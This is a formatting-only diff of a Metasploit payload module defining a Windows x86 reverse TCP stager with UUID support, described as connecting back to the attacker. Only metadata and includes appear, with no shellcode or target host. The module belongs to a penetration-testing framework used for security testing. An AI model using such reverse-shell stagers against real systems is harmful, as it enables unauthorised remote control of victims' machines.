@@ -1,15 +1,14 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/core/payload/windows/reverse_tcp'
 
 module MetasploitModule
-
   CachedSize = 314
 
   include Msf::Payload::Stager
@@ -21,16 +20,15 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Reverse TCP Stager with UUID Support',
-      'Description' => 'Connect back to the attacker with UUID Support',
-      'Author'      => [ 'hdm', 'OJ Reeves' ],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'win',
-      'Arch'        => ARCH_X86,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Convention'  => 'sockedi',
-      'Stager'      => { 'RequiresMidstager' => false }
-    ))
+                     'Name'        => 'Reverse TCP Stager with UUID Support',
+                     'Description' => 'Connect back to the attacker with UUID Support',
+                     'Author'      => [ 'hdm', 'OJ Reeves' ],
+                     'License'     => MSF_LICENSE,
+                     'Platform'    => 'win',
+                     'Arch'        => ARCH_X86,
+                     'Handler'     => Msf::Handler::ReverseTcp,
+                     'Convention'  => 'sockedi',
+                     'Stager'      => { 'RequiresMidstager' => false }))
   end
 
   #
@@ -40,5 +38,4 @@ module MetasploitModule
   def include_send_uuid
     true
   end
-
 end
